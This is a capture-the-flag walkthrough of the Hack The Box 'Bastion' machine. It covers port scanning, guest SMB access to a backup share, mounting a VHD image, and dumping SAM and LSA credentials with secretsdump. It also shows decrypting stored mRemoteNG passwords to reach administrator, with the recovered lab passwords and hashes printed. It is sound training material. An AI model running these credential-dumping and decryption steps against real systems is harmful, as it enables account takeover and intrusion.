## Default Information
IP Address: 10.10.10.134\
OS: Windows

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.134    bastion.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.134 --rate=1000 -e tun0 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-01-16 16:57:00 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 49670/tcp on 10.10.10.134                                 
Discovered open port 139/tcp on 10.10.10.134                                   
Discovered open port 49669/tcp on 10.10.10.134                                 
Discovered open port 49668/tcp on 10.10.10.134                                 
Discovered open port 5985/tcp on 10.10.10.134                                  
Discovered open port 135/tcp on 10.10.10.134                                   
Discovered open port 47001/tcp on 10.10.10.134                                 
Discovered open port 445/tcp on 10.10.10.134                                   
Discovered open port 49666/tcp on 10.10.10.134                                 
Discovered open port 22/tcp on 10.10.10.134                                    
Discovered open port 49667/tcp on 10.10.10.134                                 
Discovered open port 49665/tcp on 10.10.10.134                                 
Discovered open port 49664/tcp on 10.10.10.134  
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH for_Windows_7.9 (protocol 2.0) | Open |
| 135	| msrpc | Microsoft Windows RPC | Open |
| 139	| netbios-ssn | Microsoft Windows netbios-ssn | Open |
| 445	| microsoft-ds | Windows Server 2016 Standard 14393 microsoft-ds | Open |
| 5985	| http | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | Open |
| 47001	| http | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | Open |
| 49664	| msrpc | Microsoft Windows RPC | Open |
| 49665	| msrpc | Microsoft Windows RPC | Open |
| 49666	| msrpc | Microsoft Windows RPC | Open |
| 49667	| msrpc | Microsoft Windows RPC | Open |
| 49668	| msrpc | Microsoft Windows RPC | Open |
| 49669	| msrpc | Microsoft Windows RPC | Open |
| 49670	| msrpc | Microsoft Windows RPC | Open |

From the nmap output, we are also able to find the information used for SMB client on this machine.

```
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -13m13s, deviation: 34m36s, median: 6m44s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
```

### Web Enumeration

Using the curl command, we discover that http://bastion.htb:47001 and http://bastion.htb:5985 both returns a status code of 404. Apart from that, gobuster output were unable to discover any endpoints as well.

However, we discover that WinRM could possibly be running on both ports. To exploit this, we might possibly need to bruteforce the credentails on the WinRM service on both ports. Let us keep this in mind and come back to this if we are unable to exploit the machine later.

### SMB Enumeration

Using guest as the user, we are able to use smbmap to list the permissions of the shares. We realize that, we are actually able to read and write to the Backups share on the SMB server in this machine. 

```
┌──(kali㉿kali)-[~]
└─$ smbmap -H 10.10.10.134 -u guest                       
[+] IP: 10.10.10.134:445        Name: bastion.htb                                       
[|] Work[!] Unable to remove test directory at \\10.10.10.134\Backups\QNCREVUZAI, please remove manually
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Backups                                                 READ, WRITE
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
```

We will first list the files in the backups share on the SMB server using smbclient. From there, we discover a note.txt file which we will read using ```more``` command. We also find a nmap-test-file but upon reading it, we realized that it does not contain any useful information.

Reading the note.txt tells us that we will not need to transfer the whole backup file to our local machine. 
```
┌──(kali㉿kali)-[~]
└─$ smbclient -N //10.10.10.134/backups                                                                          1 ⚙
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jan 16 12:21:11 2022
  ..                                  D        0  Sun Jan 16 12:21:11 2022
  BCNLWYJAUX                          D        0  Sun Jan 16 03:07:04 2022
  BYDMNECSGO                          D        0  Sun Jan 16 03:06:41 2022
  CTPUWQROZS                          D        0  Sun Jan 16 02:20:26 2022
  HVOFBDPZAG                          D        0  Sun Jan 16 02:49:16 2022
  IVUJRPNACQ                          D        0  Sun Jan 16 02:48:53 2022
  nmap-test-file                      A      260  Sun Jan 16 02:21:32 2022
  note.txt                           AR      116  Tue Apr 16 06:10:09 2019
  QNCREVUZAI                          D        0  Sun Jan 16 12:21:11 2022
  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
  WindowsImageBackup                 Dn        0  Fri Feb 22 07:44:02 2019
  XQFOZPGGAU                          D        0  Sun Jan 16 12:08:59 2022

                7735807 blocks of size 4096. 2707132 blocks available
smb: \> more note.txt
Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```

Looking at the contents of ```\WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351```, we are able to find a VHD file. This VHD file could then be mounted back to our local filesystem.

```
smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> ls                                                                        
  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd     An 37761024  Fri Feb 22 07:44:03 2019                                                                    
  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd     An 5418299392  Fri Feb 22 07:45:32 2019 
```

## Exploit
### Mounting Filesystem

Looking at the size of the VHD files, the size of the files are too big to actually copy the contents over to our local machine. Hence, we will try to mount the VHD files onto our local machine instead.

```
smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> dir
  .                                  Dn        0  Fri Feb 22 07:45:32 2019   
  ..                                 Dn        0  Fri Feb 22 07:45:32 2019                                                                 
  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd     An 37761024  Fri Feb 22 07:44:03 2019                                                                    
  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd     An 5418299392  Fri Feb 22 07:45:32 2019
```

Before we start to mount the VHD files onto our local machine, let's us create a mnt folder on our Desktop. Next, let us navigate to the mnt folder and create 2 other folders, remote folder and a vhd folder.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ mkdir mnt          
                       
┌──(kali㉿kali)-[~/Desktop]
└─$ cd mnt    
                        
┌──(kali㉿kali)-[~/Desktop/mnt]
└─$ mkdir remote
                     
┌──(kali㉿kali)-[~/Desktop/mnt]
└─$ mkdir vhd     

┌──(kali㉿kali)-[~/Desktop/mnt]
└─$ ls               
remote  vhd
```

Next, we will have to mount the remote share to our mnt/remote folder using the ```mount``` command. The ```ls``` command wiill then list out all the folders from the backups share.

```
┌──(kali㉿kali)-[~/Desktop/mnt]
└─$ sudo mount -t cifs //10.10.10.134/backups /home/kali/Desktop/mnt/remote -o rw

┌──(kali㉿kali)-[~/Desktop/mnt/remote]
└─$ ls
BCNLWYJAUX  CTPUWQROZS  IVUJRPNACQ      note.txt    SDT65CB.tmp         XQFOZPGGAU
BYDMNECSGO  HVOFBDPZAG  nmap-test-file  QNCREVUZAI  WindowsImageBackup
```

Lastly, we will mount the filesystem onto our local machine in the /home/kali/Desktop/mnt/vhd directory using guestmount. However, the first VHD file does not work and we are unable to mount the first VHD file. Fortunately, we are able to mount the second VHD file. 

```
┌──(kali㉿kali)-[~/…/remote/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351]
└─$ guestmount --add /home/kali/Desktop/mnt/remote/WindowsImageBackup/L4mpje-PC/'Backup 2019-02-22 124351'/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /home/kali/Desktop/mnt/vhd -v
```

### Obtaining user credentials

Since the file system is mounted onto our local machine, we will be able to access the registry files on 10.10.10.134.

Navigating to /Desktop/mnt/vhd/Users and exploring the different users directory, we are still unable to find the user flag.

Next, we will try to navigate to /Desktop/mnt/vhd/Windows/System32/config and we are able to find that the registry hives are being stored there.

Next, we will use impacket-secretsdump to dump the password hashes and check if the password hashes can be broken. From the output, we are able to obtain the password of the user, L4mpje

```
┌──(kali㉿kali)-[~/…/vhd/Windows/System32/config]
└─$ impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DefaultPassword 
(Unknown User):bureaulampje
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x32764bdcb45f472159af59f1dc287fd1920016a6
dpapi_userkey:0xd2e02883757da99914e3138496705b223e9d03dd
[*] Cleaning up... 
```
### Obtaining user flag

Using smbmap to check the permissions using the credentials, we realize that the permissions are pretty much still the same.

```
┌──(kali㉿kali)-[~]
└─$ smbmap -u "L4mpje" -p "bureaulampje" -H 10.10.10.134 
[+] IP: 10.10.10.134:445        Name: bastion.htb                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Backups                                                 READ, WRITE
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
```

Using smbclient to view the backups share, we also realize that they are still the same as well.

```
┌──(kali㉿kali)-[~]
└─$ smbclient -N //10.10.10.134/Backups -u "L4mpje" -p "bureaulampje"
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 17 13:29:14 2022
  ..                                  D        0  Mon Jan 17 13:29:14 2022
  BCNLWYJAUX                          D        0  Sun Jan 16 03:07:04 2022
  BYDMNECSGO                          D        0  Sun Jan 16 03:06:41 2022
  CTPUWQROZS                          D        0  Sun Jan 16 02:20:26 2022
  HVOFBDPZAG                          D        0  Sun Jan 16 02:49:16 2022
  IVUJRPNACQ                          D        0  Sun Jan 16 02:48:53 2022
  nmap-test-file                      A      260  Sun Jan 16 02:21:32 2022
  note.txt                           AR      116  Tue Apr 16 06:10:09 2019
  QNCREVUZAI                          D        0  Sun Jan 16 12:21:11 2022
  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
  WindowsImageBackup                 Dn        0  Fri Feb 22 07:44:02 2019
  XQFOZPGGAU                          D        0  Sun Jan 16 12:08:59 2022

                7735807 blocks of size 4096. 2706521 blocks available
```

However, we remember from our nmap output that there is a ssh terminal on port 22 for this machine. Let us try to use the credentials to authenticate into the ssh terminal. Fortunately, we are able to successfully authenticate into the ssh terminal.

```
Microsoft Windows [Version 10.0.14393]                                                                               
(c) 2016 Microsoft Corporation. All rights reserved.                                                                 

l4mpje@BASTION C:\Users\L4mpje>whoami                                                                                
bastion\l4mpje 
```

Lastly, all that is left for us to do is to obtain the user flag.

```
l4mpje@BASTION C:\Users\L4mpje\Desktop>dir                                                                           
 Volume in drive C has no label.                                                                                     
 Volume Serial Number is 0CB3-C487                                                                                   
                                                                                                                     
 Directory of C:\Users\L4mpje\Desktop                                                                                
                                                                                                                     
22-02-2019  15:27    <DIR>          .                                                                                
22-02-2019  15:27    <DIR>          ..                                                                               
23-02-2019  09:07                32 user.txt                                                                         
               1 File(s)             32 bytes                                                                        
               2 Dir(s)  11.085.467.648 bytes free                                                                   
                                                                                                                     
l4mpje@BASTION C:\Users\L4mpje\Desktop>type user.txt                                                                 
<Redacted user flag>  
```

### Privilege Escalation to root

Navigating to C:\Program Files (x86), we are able to find a mRemoteNG program. Looking up exploits for mRemoteNG, we are able to find a tutorial [here](https://vk9-sec.com/exploiting-mremoteng/)

Firstly, we will have to extract the confCons.xml file from the C:\Users\L4mpje\AppData\Roaming\mRemoteNG directory. The confCons.xml file contains the encrypted password for all the users.

```
l4mpje@BASTION C:\Program Files (x86)\mRemoteNG>cd %appdata%                                                    
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming>cd mRemoteNG                                                    
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>type confCons.xml 
```

Inspecting the confCons.xml file, we are able to obtain the adminstrator password, but the password is currently encrypted.

```
Username="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowV
RdC7emf7lWWA10dQKiw=="
```

Using the python script from (here)[https://github.com/haseebT/mRemoteNG-Decrypt], we are able to decrypt the password.

```
python3 decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
Password: thXLHM96BeKL0ER2
```
### Obtaining root flag
Using the credentials obtained, we are able to ssh into the server with adminstator privileges.

```
administrator@BASTION C:\Users\Administrator>whoami                                                                  
bastion\administrator 
```

We will then be able to obtain the root flag.

```
administrator@BASTION C:\Users\Administrator\Desktop>type root.txt                                                   
<Redacted root flag>
```
